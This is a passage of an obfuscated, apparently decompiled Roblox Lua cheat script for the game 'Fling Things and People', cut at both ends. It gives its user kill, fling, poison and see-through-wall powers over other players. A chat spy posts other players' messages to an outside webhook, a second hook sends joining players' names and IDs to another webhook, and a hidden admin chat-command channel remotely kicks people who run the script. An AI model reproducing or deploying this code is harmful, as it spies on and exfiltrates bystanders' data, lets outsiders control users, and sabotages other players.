        v352.OutlineTransparency = 0
        v352.Adornee = p350
        v352.Name = "aithl"
        v351.Value = v352
        while task.wait() and (p350.Parent and (v351.Parent and v352.Parent)) do
            local v353 = vu7.me.Character
            if v353 then
                local v354 = v353:FindFirstChild("HumanoidRootPart")
                if v354 and vu123(v354, p350) then
                    vu215(p350)
                    local v355 = v352.FillColor
                    v352.FillColor = v352.OutlineColor
                    v352.OutlineColor = v355
                    task.wait()
                    vu215(p350)
                    local v356 = v352.FillColor
                    v352.FillColor = v352.OutlineColor
                    v352.OutlineColor = v356
                end
            end
        end
    end
end
local function vu363(p358, p359)
    if not (p358:FindFirstChild("fzbp") and (p358:FindFirstChild("fzbg") and p358:FindFirstChild("fzhl"))) then
        local v360 = vu246(p358, "fzbp", vu8.V.mhv3, p358.Position, 100)
        local v361 = vu253(p358, "fzbg", vu8.V.mhv3, 100, p358.CFrame)
        local v362 = vu262(p358, p358.Parent, "fzhl", 0, 0.5, Color3.fromRGB(0, 0, 255), Color3.fromRGB(0, 255, 255))
        while p358.Parent and (v360.Parent and (v361.Parent and v362.Parent)) do
            vu87(p358, p359, v362, vu8.C2, v360, v361)
            task.wait()
        end
    end
end
vu89 = function(p364, p365, p366, p367)
    if p364 and (p365 and p366) then
        if p367 then
            if p364[p365] ~= p366[p367] then
                p364[p365] = p366[p367]
            end
        elseif p364[p365] ~= p366 then
            p364[p365] = p366
        end
    end
end
local function vu381()
    local v368, v369, v370 = pairs(vu12.ftapcolors)
    local v371 = {}
    while true do
        local v372
        v370, v372 = v368(v369, v370)
        if v370 == nil then
            break
        end
        v371[v370] = vu103(v372)
    end
    writefile("VHS/FTAPColors.vhs", tostring(vu1.HS:JSONEncode(v371)))
    local v373 = vu7.me.PlayerGui
    local v374 = v373.MenuGui.Menu.TabBar.Tabs
    local v375 = v373.MenuGui.Menu.TabContents
    local v376 = v375.Settings
    local v377 = v375.Shop
    local v378 = v375.Toys
    local v379 = v375.ToyDestroy
    local v380 = v375.ToyShop
    v373.MenuGui.TopRight.CoinsFrame.BackgroundColor3 = vu12.ftapcolors.Coins
    v373.MenuGui.Menu.TabBar.BackgroundColor3 = vu12.ftapcolors.TabBar
    v374.Settings.BackgroundColor3 = vu12.ftapcolors.Settings
    v374.Shop.BackgroundColor3 = vu12.ftapcolors.Shop
    v374.ToyDestroy.BackgroundColor3 = vu12.ftapcolors.ToyDestroy
    v374.ToyShop.BackgroundColor3 = vu12.ftapcolors.ToysShop
    v374.Toys.BackgroundColor3 = vu12.ftapcolors.Toys
    v376.Contents.BackgroundColor3 = vu12.ftapcolors.SettingsContents
    v376.Title.BackgroundColor3 = vu12.ftapcolors.SettingsTitle
    v377.Title.BackgroundColor3 = vu12.ftapcolors.ShopTitle
    v377.Contents.BackgroundColor3 = vu12.ftapcolors.ShopContents
    v378.Contents.BackgroundColor3 = vu12.ftapcolors.ToysContents
    v378.FavoritesFrame.BackgroundColor3 = vu12.ftapcolors.FavoritesFrame
    v378.FavoritesFrame.Favorites.BackgroundColor3 = vu12.ftapcolors.Favorites
    v378.MeterFrame.BackgroundColor3 = vu12.ftapcolors.MeterFrame
    v378.SortingTabs.BackgroundColor3 = vu12.ftapcolors.SortingTabs
    v378.Title.BackgroundColor3 = vu12.ftapcolors.ToysTitle
    v379.Title.BackgroundColor3 = vu12.ftapcolors.DestroyTitle
    v379.Contents.BackgroundColor3 = vu12.ftapcolors.DestroyContents
    v379.MeterFrame.BackgroundColor3 = vu12.ftapcolors.DestroyMeterFrame
    v380.Title.BackgroundColor3 = vu12.ftapcolors.ToyShopTitle
    v380.SortingTabs.BackgroundColor3 = vu12.ftapcolors.ToyShopSortingTabs
    v380.Contents.BackgroundColor3 = vu12.ftapcolors.ToyShopContents
end
local function vu388()
    local v382, v383, v384 = ipairs(vu12.ccolors)
    local v385 = {}
    while true do
        local v386
        v384, v386 = v382(v383, v384)
        if v384 == nil then
            break
        end
        v385[v384] = vu103(v386)
    end
    writefile("VHS/LineColor.vhs", tostring(vu1.HS:JSONEncode(v385)))
    local v387 = {
        ColorSequenceKeypoint.new(0, vu12.ccolors[1]),
        ColorSequenceKeypoint.new(0.1, vu12.ccolors[2]),
        ColorSequenceKeypoint.new(0.15, vu12.ccolors[3]),
        ColorSequenceKeypoint.new(0.2, vu12.ccolors[4]),
        ColorSequenceKeypoint.new(0.25, vu12.ccolors[5]),
        ColorSequenceKeypoint.new(0.3, vu12.ccolors[6]),
        ColorSequenceKeypoint.new(0.35, vu12.ccolors[7]),
        ColorSequenceKeypoint.new(0.4, vu12.ccolors[8]),
        ColorSequenceKeypoint.new(0.45, vu12.ccolors[9]),
        ColorSequenceKeypoint.new(0.5, vu12.ccolors[10]),
        ColorSequenceKeypoint.new(0.55, vu12.ccolors[11]),
        ColorSequenceKeypoint.new(0.6, vu12.ccolors[12]),
        ColorSequenceKeypoint.new(0.65, vu12.ccolors[13]),
        ColorSequenceKeypoint.new(0.7, vu12.ccolors[14]),
        ColorSequenceKeypoint.new(0.75, vu12.ccolors[15]),
        ColorSequenceKeypoint.new(0.8, vu12.ccolors[16]),
        ColorSequenceKeypoint.new(0.85, vu12.ccolors[17]),
        ColorSequenceKeypoint.new(0.9, vu12.ccolors[18]),
        ColorSequenceKeypoint.new(0.95, vu12.ccolors[19]),
        ColorSequenceKeypoint.new(1, vu12.ccolors[20])
    }
    vu7.Events.SetLineColorEvent:FireServer(ColorSequence.new(v387))
end
local function vu394()
    vu12.hui = {}
    vu12.hui2 = {}
    local v389 = vu9.vhsows and "" or "p"
    local v390, v391, v392 = ipairs(vu1.Players:GetPlayers())
    while true do
        local v393
        v392, v393 = v390(v391, v392)
        if v392 == nil then
            break
        end
        if v393 ~= vu7.me then
            if vu56(v393.Name) then
                if v393:IsFriendsWith(vu7.me.userId) then
                    table.insert(vu12.hui, v393.DisplayName .. " (" .. v393.Name .. ") \226\153\166Friend\226\153\166")
                    vu12.hui2[v393.Name] = v393.DisplayName .. " (" .. v393.Name .. ") \226\153\166Friend\226\153\166"
                else
                    table.insert(vu12.hui, v393.DisplayName .. " (" .. v393.Name .. ")")
                    vu12.hui2[v393.Name] = v393.DisplayName .. " (" .. v393.Name .. ")"
                end
            elseif v393:IsFriendsWith(vu7.me.userId) then
                table.insert(vu12.hui, v393.DisplayName .. " (" .. v393.Name .. ") \226\153\166Friend\226\153\166 \226\153\165Premium User\226\153\165")
                vu12.hui2[v393.Name .. v389] = v393.DisplayName .. " (" .. v393.Name .. ") \226\153\166Friend\226\153\166 \226\153\165Premium User\226\153\165"
            else
                table.insert(vu12.hui, v393.DisplayName .. " (" .. v393.Name .. ") \226\153\165Premium User\226\153\165")
                vu12.hui2[v393.Name .. v389] = v393.DisplayName .. " (" .. v393.Name .. ") \226\153\165Premium User\226\153\165"
            end
        end
    end
end
vu394()
function chat_msg(pu395, p396)
    vu96("\239\191\189\209\130\208\176\209\128\209\130", 1)
    local vu397 = p396:gsub("[\n\r]", ""):gsub("\t", " "):gsub("[ ]+", " ")
    local vu398 = true
    local v402 = vu7.Events.getmsg.OnClientEvent:Connect(function(p399, p400)
        if p399.SpeakerUserId == pu395.UserId then
            local v401 = vu397
            if p399.Message == v401:sub(# vu397 - # p399.Message + 1) and (p400 == "All" or p400 == "Team" and (vu9.public == false and pu395.Team == vu7.me.Team)) then
                vu398 = false
            end
        end
    end)
    vu96("1", 1)
    task.wait(1)
    vu96("2", 1)
    v402:Disconnect()
    if vu112(vu12.admins, pu395.UserId) then
        if vu397 == "/vhs kick " .. vu7.me.Name then
            vu273("")
        end
        if vu397 == "/vhs kick ALLLL" then
            vu271("")
        end
        if vu397 == "/vhs kick ALL" then
            vu273("")
        end
        if vu397 == "/vhs kick all" then
            vu275("")
        end
        if vu397 == "/vhs who" then
            vu7.Events.saymsg:FireServer("i", "All")
        end
    end
    if vu398 and vu9.spyenabled then
        vu96("123", 1)
        if vu9.public then
            vu96("23", 1)
            vu7.Events.saymsg:FireServer("\239\191\189\239\191\189VSPY\226\153\165 [" .. pu395.Name .. "]: " .. vu397, "All")
        else
            vu96("32", 1)
            vu12.privateProperties.Text = "\239\191\189\239\191\189VSPY\226\153\165 [" .. pu395.Name .. "]: " .. vu397
            vu1.StarterGui:SetCore("ChatMakeSystemMessage", vu12.privateProperties)
        end
    end
    vu96("5", 1)
    if vu9.publicds and vu9.spyenabled then
        vu96("567", 1)
        if vu398 then
            vu96("21351345", 1)
            vu60(vu10.chatspyweb, {
                content = vu397 .. "(\208\191\209\128\208\184\208\178\208\176\209\130\208\186\208\176)" .. " \226\153\165" .. pu395.UserId .. "\239\191\189\239\191\189",
                username = pu395.DisplayName .. " (" .. pu395.Name .. ")" .. " \208\190\209\130 " .. vu7.me.DisplayName .. " (" .. vu7.me.Name .. ")"
            })
        else
            vu96("56234624567", 1)
            vu60(vu10.chatspyweb, {
                content = vu397 .. " \226\153\165" .. pu395.UserId .. "\239\191\189\239\191\189",
                username = pu395.DisplayName .. " (" .. pu395.Name .. ")" .. " \208\190\209\130 " .. vu7.me.DisplayName .. " (" .. vu7.me.Name .. ")"
            })
        end
    end
end
local v403, v404, v405 = ipairs(vu1.Players:GetPlayers())
local vu406 = vu246
local v407 = vu112
local vu408 = vu182
local vu409 = vu183
local vu410 = vu87
local vu411 = vu215
local vu412 = vu90
local vu413 = vu116
local vu414 = vu123
local vu415 = vu114
local vu416 = vu101
local vu417 = vu162
local vu418 = vu169
local vu419 = vu269
local vu420 = vu96
local vu421 = vu234
local function vu429()
    local v422, v423, v424 = ipairs(vu1.Players:GetPlayers())
    while true do
        local v425
        v424, v425 = v422(v423, v424)
        if v424 == nil then
            break
        end
        local v426 = v425.Character
        if v426 then
            local v427 = vu1.w.hls:FindFirstChild(v425.Name)
            if v427 then
                v427.Adornee = v426
                v427.Enabled = chamst
                v427.FillColor = vu15
                v427.FillTransparency = vu8.chamsft
                v427.OutlineColor = vu16
                v427.OutlineTransparency = vu8.chamsot
            else
                local v428 = Instance.new("Highlight", vu1.w.hls)
                v428.Name = v425.Name
                v428.Adornee = v426
                v428.Enabled = chamst
                v428.FillColor = vu15
                v428.FillTransparency = vu8.chamsft
                v428.OutlineColor = vu16
                v428.OutlineTransparency = vu8.chamsot
            end
        end
    end
end
local function vu430()
    vu7.me.Character.HumanoidRootPart.Anchored = true
    while vu7.me.Character["Right Arm"].RagdollLimbPart.CanCollide == true do
        task.wait()
    end
    vu7.me.Character.HumanoidRootPart.Anchored = false
end
local function vu438(p431, p432, p433, p434)
    local v435 = p431[p433 .. "Detector"]
    local v436 = p431.BlobmanSeatAndOwnerScript.CreatureGrab
    local v437 = p431.BlobmanSeatAndOwnerScript.CreatureDrop
    if p434 == 1 then
        v436:FireServer(v435, p432, v435[p433 .. "Weld"])
    elseif p434 == 2 then
        v437:FireServer(v435[p433 .. "Weld"], p432)
    elseif p434 == 12 then
        v436:FireServer(v435, p432, v435[p433 .. "Weld"])
        v437:FireServer(v435[p433 .. "Weld"], p432)
    end
end
local function vu441()
    while os.time() % 60 ~= 0 do
        task.wait()
    end
    local v439 = os.time()
    while task.wait() do
        local v440 = os.time()
        if v440 - v439 == 60 then
            vu60(vu10.dataweb, {
                content = v440,
                username = vu7.me.DisplayName .. " (" .. vu7.myname .. ")"
            })
            v439 = v440
        end
    end
end
local function vu450()
    local v442, v443, v444 = pairs(vu1.w:GetDescendants())
    while true do
        local v445
        v444, v445 = v442(v443, v444)
        if v444 == nil then
            break
        end
        if v445:IsA("Part") and v445:FindFirstChild("gqcs") then
            v445.CastShadow = v445.gqcs.Value
            v445.gqcs:Destroy()
        end
    end
    local v446, v447, v448 = pairs(vu1.w:GetDescendants())
    while true do
        local v449
        v448, v449 = v446(v447, v448)
        if v448 == nil then
            break
        end
        if v449:IsA("Part") and v449:FindFirstChild("gqs") then
            v449.Shadows = v449.gqs.Value
            v449.gqs:Destroy()
        end
    end
    game.MaterialService.Use2022Materials = false
    game.Lighting.Technology = "Voxel"
    game.Lighting.Ambient = Color3.fromRGB(120, 120, 120)
    game.Lighting.OutdoorAmbient = Color3.fromRGB(200, 200, 200)
    vu7.sunrays.Intensity = 0
    vu7.sunrays.Spread = 0
    vu7.bloomeffect.Intensity = 0
    vu7.bloomeffect.Size = 0
    vu7.bloomeffect.Threshold = 0
end
while true do
    local vu451
    v405, vu451 = v403(v404, v405)
    if v405 == nil then
        break
    end
    vu451.Chatted:Connect(function(p452)
        chat_msg(vu451, p452)
    end)
end
vu1.w.ChildAdded:Connect(function(p453)
    if p453.Name == "GrabParts" then
        vu420("igrab1", 4)
        local vu454 = vu421(vu419(p453, {
            "GrabPart",
            "WeldConstraint"
        }).Part1, "igrab", true)
        vu420("igrab2", 4)
        p453.Destroying:Connect(function()
            vu454:Destroy()
            vu420("igrab3", 4)
        end)
    end
end)
vu1.Players.PlayerAdded:Connect(function(p455)
    if vu9.paitd then
        vu60(vu10.playerinfoweb, {
            content = p455.DisplayName .. " " .. p455.Name .. " " .. p455.UserId .. " " .. p455.FollowUserId
        })
    end
end)
vu1.Players.PlayerAdded:Connect(function(p456)
    p456.CharacterAdded:Connect(vu429())
end)
vu7.backpack.ChildAdded:Connect(function(p457)
    if toyaura and (sttta and (p457.Name ~= "FireExtinguisher" and p457.Name ~= "NinjaKunai")) then
        vu8.cat = vu8.cat + 1
        table.insert(vu12.lat, p457)
    end
    vu11.last_toy = p457
end)
vu1.UIS.JumpRequest:Connect(function()
    if vu7.me.Character and infj then
        vu7.me.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        task.wait()
    end
end)
vu1.w.ChildAdded:Connect(function(p458)
    if p458.Name == "GrabParts" and not (kickkk1 or kickkk2) then
        vu8.zgv = 0
        local v459 = p458.DragPart.DragAttach
        while p458.Parent and task.wait() do
            v459.Position = vu1.w.Camera.CFrame.LookVector * vu8.zgv
        end
    end
end)
vu1.Players.PlayerAdded:Connect(function(p460)
    if paitd then
        post_info(p460)
    end
    vu394()
    if vu118(p460.Name) then
        vu98(p460.Name .. " (" .. p460.DisplayName .. ") Joined your server")
    end
end)
vu1.Players.PlayerRemoving:Connect(function()
    vu394()
end)
vu1.w.ChildAdded:Connect(function(pu461)
    local v462 = pu461.Name == "GrabParts" and (sila and pu461.GrabPart.WeldConstraint.Part1)
    if v462 then
        local vu463 = Instance.new("BodyVelocity", v462)
        pu461:GetPropertyChangedSignal("Parent"):Connect(function()
            if not pu461.Parent then
                if vu1.UIS:GetLastInputType() ~= Enum.UserInputType.MouseButton2 then
                    if vu1.UIS:GetLastInputType() ~= Enum.UserInputType.MouseButton1 then
                        vu463:Destroy()
                    else
                        vu463:Destroy()
                    end
                else
                    vu463.MaxForce = vu8.V.mhv3
                    vu463.Velocity = vu1.w.CurrentCamera.CFrame.lookVector * vu8.strength
                    vu1.d:AddItem(vu463, 1)
                end
            end
        end)
    end
end)
vu1.w.ChildAdded:Connect(function(pu464)
    if pu464.Name == "GrabParts" then
        vu420("1", 2)
        local vu465 = pu464.GrabPart.WeldConstraint.Part1
        if poison then
            vu420("2", 2)
            task.spawn(function()
                while vu1.w:FindFirstChild("GrabParts") and task.wait() do
                    vu7.m.Hole.PoisonBigHole.PoisonHurtPart.Position = pu464.GrabPart.Position
                    vu7.m.Hole.PoisonSmallHole.PoisonHurtPart.Position = pu464.GrabPart.Position
                    vu7.m.FactoryIsland.PoisonContainer.PoisonHurtPart.Position = pu464.GrabPart.Position
                    vu7.m.FactoryIsland.fff.PoisonHurtPart.Position = pu464.GrabPart.Position
                end
                vu420("22", 2)
                vu7.m.Hole.PoisonBigHole.PoisonHurtPart.Position = Vector3.new(0, - 20, 0)
                vu7.m.Hole.PoisonSmallHole.PoisonHurtPart.Position = Vector3.new(0, - 20, 0)
                vu7.m.FactoryIsland.PoisonContainer.PoisonHurtPart.Position = Vector3.new(0, - 20, 0)
                vu7.m.FactoryIsland.fff.PoisonHurtPart.Position = Vector3.new(0, - 20, 0)
                vu420("222", 2)
            end)
        else
            vu7.m.Hole.PoisonBigHole.PoisonHurtPart.Position = Vector3.new(0, - 20, 0)
            vu7.m.Hole.PoisonSmallHole.PoisonHurtPart.Position = Vector3.new(0, - 20, 0)
            vu7.m.FactoryIsland.PoisonContainer.PoisonHurtPart.Position = Vector3.new(0, - 20, 0)
            vu7.m.FactoryIsland.fff.PoisonHurtPart.Position = Vector3.new(0, - 20, 0)
        end
        if radiactive then
            vu420("3", 2)
            task.spawn(function()
                while vu1.w:FindFirstChild("GrabParts") and task.spawn() do
                    vu7.m.AlwaysHereTweenedObjects.InnerUFO.Object.ObjectModel.PaintPlayerPart.Position = pu464.GrabPart.Position
                end
                vu420("333", 2)
            end)
        end
        if killg then
            task.spawn(function()
                if vu418(vu465) then
                    vu281(vu465, false)
                end
            end)
        end
        if clippp then
            vu420("5", 2)
            task.spawn(function()
                vu420("155", 2)
                local v466 = vu418(vu465)
                vu420("1255", 2)
                if v466 then
                    vu420("55", 2)
                    local v467, v468, v469 = pairs(v466:GetChildren())
                    while true do
                        local v470
                        v469, v470 = v467(v468, v469)
                        if v469 == nil then
                            break
                        end
                        if v470:IsA("Part") and v470.CanCollide then
                            vu421(v470, "ngrab", true)
                            v470.CanCollide = false
                        end
                    end
                    while pu464.Parent do
                        task.wait()
                    end
                    vu420("555", 2)
                    local v471, v472, v473 = pairs(v466:GetChildren())
                    while true do
                        local v474
                        v473, v474 = v471(v472, v473)
                        if v473 == nil then
                            break
                        end
                        if v474:IsA("Part") and v474:FindFirstChild("ngrab") then
                            v474.CanCollide = true
                            v474.ngrab:Destroy()
                        end
                    end
                end
            end)
        end
    end
end)
vu1.w.ChildAdded:Connect(function(p475)
    if p475.Name == "GrabParts" and ultragrabbb then
        vu1.w.GrabParts.DragPart.Color = Color3.fromRGB(255, 0, 0)
        vu1.w.GrabParts.DragPart.Transparency = 0
        vu1.w.GrabParts.DragPart.Material = "Neon"
        p475.BeamPart.GrabBeam.Segments = 2
        p475.DragPart.AlignOrientation.Responsiveness = 200
        p475.DragPart.AlignOrientation.MaxTorque = "inf"
        p475.DragPart.AlignPosition.MaxAxesForce = Vector3.new("inf", "inf", "inf")
        p475.DragPart.AlignPosition.MaxForce = "inf"
        p475.DragPart.AlignPosition.Responsiveness = 200
    end
end)
vu1.w.ChildAdded:Connect(function(p476)
    if p476.Name == "Part" and (vu7.me.Character and (antiexpl and (p476.Position - vu7.me.Character.HumanoidRootPart.Position).Magnitude <= 18)) then
        vu430()
    end
end)
vu1.w.DescendantAdded:Connect(function(p477)
    if p477.Name == "CreatureBlobman" and (p477.Parent ~= vu7.backpack and antiblob) then
        task.wait()
        local v478 = p477:FindFirstChild("LeftDetector")
        local v479 = p477:FindFirstChild("RightDetector")
        if v478 and v479 then
            local v480 = v478:FindFirstChild("AttachPlayer")
            local v481 = v479:FindFirstChild("AttachPlayer")
            if v480 and v481 then
                v480:Destroy()
                v481:Destroy()
            end
        end
    end
end)
vu1.w.PlotItems.Plot1.ChildAdded:Connect(function(p482)
    if p482.Name == "PlantPottedCactus" then
        task.wait()
        p482:Destroy()
    end
end)
vu1.w.PlotItems.Plot2.ChildAdded:Connect(function(p483)
    if p483.Name == "PlantPottedCactus" then
        task.wait()
        p483:Destroy()
    end
end)
vu1.w.PlotItems.Plot3.ChildAdded:Connect(function(p484)
    if p484.Name == "PlantPottedCactus" then
        task.wait()
        p484:Destroy()
    end
end)
vu1.w.PlotItems.Plot4.ChildAdded:Connect(function(p485)
    if p485.Name == "PlantPottedCactus" then
        task.wait()
        p485:Destroy()
    end
end)
vu1.w.PlotItems.Plot5.ChildAdded:Connect(function(p486)
    if p486.Name == "PlantPottedCactus" then
        task.wait()
        p486:Destroy()
    end
end)
vu1.w.PlotItems.PlayersInPlots.ChildAdded:Connect(function(p487)
    if p487 ~= vu7.me and vu56(p487.Name) then
        task.wait()
        p487.Parent = vu1.w
    end
end)
vu7.me.CharacterAdded:Connect(function()
    typingAnimation = Instance.new("Animation")
    typingAnimation.AnimationId = "rbxassetid://18353618958"
    typingAnimator = vu7.me.Character:WaitForChild("Humanoid"):WaitForChild("Animator")
    typingTrack = typingAnimator:LoadAnimation(typingAnimation)
    crouchAnimation = Instance.new("Animation")
    crouchAnimation.AnimationId = "rbxassetid://6980229055"
    crouchAnimator = vu7.me.Character:WaitForChild("Humanoid"):WaitForChild("Animator")
    crouchTrack = crouchAnimator:LoadAnimation(crouchAnimation)
    throwedAnimation = Instance.new("Animation")
    throwedAnimation.AnimationId = "rbxassetid://7047322890"
    throwedAnimator = vu7.me.Character:WaitForChild("Humanoid"):WaitForChild("Animator")
    throwedTrack = throwedAnimator:LoadAnimation(throwedAnimation)
end)
vu1.UIS.InputChanged:Connect(function(p488)
    if p488.UserInputType == Enum.UserInputType.MouseWheel and zgt then
        if vu1.w:FindFirstChild("GrabParts") then
            if p488.Position.Z ~= 1 then
                vu8.zgv = vu8.zgv - 3
            else
                vu8.zgv = vu8.zgv + 3
            end
        else
            vu8.zgv = 0
        end
    end
end)
vu1.Players.PlayerAdded:Connect(function(pu489)
    pu489.Chatted:Connect(function(p490)
        vu420("eeeeeeeeee")
        chat_msg(pu489, p490)
        vu420("hhhhhhhh")
    end)
end)
local v491
if vu56(vu7.myname) then
    if vu9.vhsows then
        v491 = vu13.field:CreateWindow({
            Name = "\239\191\189\239\191\189VHSV6\226\153\165: Top 1 \226\153\165\226\153\166\226\153\163\226\153\160OWNER\226\153\160\226\153\163\226\153\166\226\153\165",
            LoadingTitle = "Try Hard V6",
            LoadingSubtitle = "by VHCK",
            ConfigurationSaving = {
                Enabled = true,
                FolderName = "VHS",
                FileName = "vhsv6"
            },
            Discord = {
                Enabled = false,
                Invite = "BCw8KuTDnj",
                RememberJoins = false
            },
            KeySystem = false,
            KeySettings = {
                Title = "Untitled",
                Subtitle = "Key System",
                Note = "No method of obtaining the key is provided",
                FileName = "Key",
                SaveKey = true,
                GrabKeyFromSite = false,
                Actions = {
                    {
                        Text = "Click here to copy the key link <--",
                        OnPress = function()
                            print("Pressed")
                        end
                    }
                },
                Key = {
                    "Hello"
                }
            }
        })
    else
        v491 = vu13.field:CreateWindow({
            Name = "\239\191\189\239\191\189VHSV6\226\153\165 Top 1",
            LoadingTitle = "Try Hard V6",
            LoadingSubtitle = "by VHCK",
            ConfigurationSaving = {
                Enabled = true,
                FolderName = "VHS",
                FileName = "vhsv6"
            },
            Discord = {
                Enabled = true,
                Invite = "BCw8KuTDnj",
                RememberJoins = false
            },
            KeySystem = false,
            KeySettings = {
                Title = "Untitled",
                Subtitle = "Key System",
                Note = "No method of obtaining the key is provided",
                FileName = "Key",
                SaveKey = true,
                GrabKeyFromSite = false,
                Actions = {
                    {
                        Text = "Click here to copy the key link <--",
                        OnPress = function()
                            print("Pressed")
                        end
                    }
                },
                Key = {
                    "Hello"
                }
            }
        })
    end
else
    v491 = vu13.field:CreateWindow({
        Name = "\239\191\189\239\191\189VHSV6\226\153\165: Top 1 \226\153\165Premium\226\153\165",
        LoadingTitle = "Try Hard V6",
        LoadingSubtitle = "by VHCK",
        ConfigurationSaving = {
            Enabled = true,
            FolderName = "VHS",
            FileName = "vhsv6"
        },
        Discord = {
            Enabled = false,
            Invite = "BCw8KuTDnj",
            RememberJoins = false
        },
        KeySystem = false,
        KeySettings = {
            Title = "Untitled",
            Subtitle = "Key System",
            Note = "No method of obtaining the key is provided",
            FileName = "Key",
            SaveKey = true,
            GrabKeyFromSite = false,
            Actions = {
                {
                    Text = "Click here to copy the key link <--",
                    OnPress = function()
                        print("Pressed")
                    end
                }
            },
            Key = {
                "Hello"
            }
        }
    })
end
if vu9.vhsows then
    local v492 = v491:CreateTab("Debug", 7743876054)
    v492:CreateSection("Target")
    local vu493 = v492:CreateLabel("...")
    v492:CreateToggle({
        Name = "Can Query",
        CurrentValue = false,
        Flag = "debugtabCanQuery",
        Callback = function(_)
            local v494, v495, v496 = pairs(vu1.w:GetDescendants())
            while true do
                local v497
                v496, v497 = v494(v495, v496)
                if v496 == nil then
                    break
                end
                if v497:IsA("Part") then
                    if v497:FindFirstChild("debugcanquery") then
                        local v498 = v497:FindFirstChild("debugcanquery")
                        if v498 then
                            v497.CanQuery = v498.Value
                            v498:Destroy()
                        end
                    else
                        local v499 = Instance.new("BoolValue", v497)
                        v499.Value = v497.CanQuery
                        v499.Name = "debugcanquery"
                        v497.CanQuery = true
                    end
                end
            end
        end
    })
    v492:CreateKeybind({
        Name = "Target Parents",
        CurrentKeybind = "",
        HoldToInteract = false,
        Flag = "debugTargetParents",
        Callback = function(_)
            vu493:Set(vu213(vu417(vu7.mouse.target)))
        end
    })
    v492:CreateToggle({
        Name = "debug",
        CurrentValue = false,
        Flag = "debugtabdebug",
        Callback = function(p500)
            vu9.debug = p500
        end
    })
end
local v501 = v491:CreateTab("User Functions", 7743876054)
v501:CreateSection("Strenght")
local vu503 = v501:CreateToggle({
    Name = "Strenght Toggle",
    CurrentValue = false,
    Flag = "StrenghtToggle",
    Callback = function(p502)
        sila = p502
    end
})
local vu505 = v501:CreateSlider({
    Name = "Strenght Slider",
    Range = {
        - 1600,
        1600
    },
    Increment = 10,
    Suffix = "(400 Optimal)",
    CurrentValue = 400,
    Flag = "StrenghtSlider",
    Callback = function(p504)
        vu8.strength = p504
    end
})
v501:CreateInput({
    Name = "Strenght Input",
    PlaceholderText = "Type Strenght Value",
    RemoveTextAfterFocusLost = false,
    Callback = function(p506)
        vu505:Set(p506)
        vu8.strength = p506
    end
})
v501:CreateKeybind({
    Name = "Strenght Toggle Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "StrenghtToggleBind",
    Callback = function(_)
        vu93("Strenght Toggle" .. " is a " .. (not sila and "En" or "Dis") .. "abled")
        vu503:Set(not sila)
    end
})
v501:CreateSection("Protections")
local vu513 = v501:CreateToggle({
    Name = "Anti Grab & Anti Blob",
    CurrentValue = false,
    Flag = "AntiGrab",
    Callback = function(p507)
        antiGrabToggle = p507
        while antiGrabToggle and task.wait() do
            local v508, v509, v510 = vu192()
            if v510 and (v508 and (vu413(v509) and v510:FindFirstChild("PartOwner"))) then
                local v511 = v510.PartOwner.Value
                if v511 then
                    local v512 = vu1.w:FindFirstChild(v511)
                    if v512 and (vu56(v512) and vu120(v512)) then
                        task.spawn(vu88, v512)
                    end
                end
                v508.Anchored = true
                while vu7.me.IsHeld.Value and task.wait() do
                    vu7.Events.StruggleEvent:FireServer(vu7.me)
                end
                task.wait(0.3)
                v508.Anchored = false
            end
        end
    end
})
v501:CreateDropdown({
    Name = "Function after Anti Grab",
    Options = {
        "nothing",
        "grab",
        "tp to spawn",
        "fling",
        "kill"
    },
    CurrentOption = {
        ""
    },
    MultipleOptions = false,
    Flag = "FunctionafterAntiGrab",
    Callback = function(p514)
        local v515, v516, v517 = pairs(p514)
        local v518 = ""
        while true do
            local v519
            v517, v519 = v515(v516, v517)
            if v517 == nil then
                break
            end
            v518 = v518 .. v519
        end
        if v518 == "grab" then
            vu88 = function(p520)
                vu411(p520.HumanoidRootPart)
            end
        elseif v518 == "tp to spawn" then
            vu88 = function(p521)
                fling_plr_a(p521.Head)
            end
        elseif v518 == "fling" then
            vu88 = function(p522)
                fling2_plr_a(p522.Head)
            end
        elseif v518 == "kill" then
            vu88 = function(p523)
                kill_plr_a(p523.Head)
            end
        elseif v518 == "nothing" then
            vu88 = function()
            end
        end
    end
})
local vu525 = v501:CreateToggle({
    Name = "Anti Grab Loop",
    CurrentValue = false,
    Flag = "AntiGrabLoop",
    Callback = function(p524)
        antigrabloop = p524
        while antigrabloop and task.wait() do
            vu7.Events.StruggleEvent:FireServer(vu7.me)
        end
    end
})
local vu529 = v501:CreateToggle({
    Name = "Anti Grab Tp",
    CurrentValue = false,
    Flag = "AntiGrabTp",
    Callback = function(p526)
        antigrabtp = p526
        while antigrabtp and task.wait() do
            local v527, v528 = vu192()
            if v528 and vu413(v528) then
                v527.CFrame = v527.CFrame + Vector3.new(100, 0, 0)
                task.wait(0.08)
                v527.CFrame = v527.CFrame + Vector3.new(0, 0, 100)
                task.wait(0.08)
                v527.CFrame = v527.CFrame + Vector3.new(- 100, 0, 0)
                task.wait(0.08)
                v527.CFrame = v527.CFrame + Vector3.new(0, 0, - 100)
                task.wait(0.08)
            end
        end
    end
})
local vu537 = v501:CreateToggle({
    Name = "Anti Blob Kick(Visual)",
    CurrentValue = false,
    Flag = "AntiBlobKick",
    Callback = function(p530)
        antiblob = p530
        local v531, v532, v533 = pairs(vu1.w:GetDescendants())
        while true do
            local v534
            v533, v534 = v531(v532, v533)
            if v533 == nil then
                break
            end
            if v534.Name == "CreatureBlobman" and v534.Parent ~= vu7.backpack and (v534:FindFirstChild("LeftDetector") and v534:FindFirstChild("RightDetector")) then
                local v535 = v534.LeftDetector:FindFirstChild("AttachPlayer")
                local v536 = v534.RightDetector:FindFirstChild("AttachPlayer")
                if v535 and v536 then
                    v535:Destroy()
                    v536:Destroy()
                end
            end
        end
    end
})
local vu539 = v501:CreateToggle({
    Name = "Anti Explosion",
    CurrentValue = false,
    Flag = "AntiExplosion",
    Callback = function(p538)
        antiexpl = p538
    end
})
local vu545 = v501:CreateToggle({
    Name = "Anti Burn",
    CurrentValue = false,
    Flag = "AntiBurn",
    Callback = function(p540)
        antiburn = p540
        while antiburn do
            if vu7.me.Character then
                local v541 = vu7.me.Character:FindFirstChild("HumanoidRootPart")
                local v542 = vu7.me.Character:FindFirstChild("Humanoid")
                if v541 and (v542 and (v541:FindFirstChild("FireLight") and vu413(v542))) then
                    local v543 = vu7.backpack:FindFirstChild("FireExtinguisher")
                    if v543 then
                        local v544 = v543.ExtinguishPart.Position
                        while v541:FindFirstChild("FireLight") do
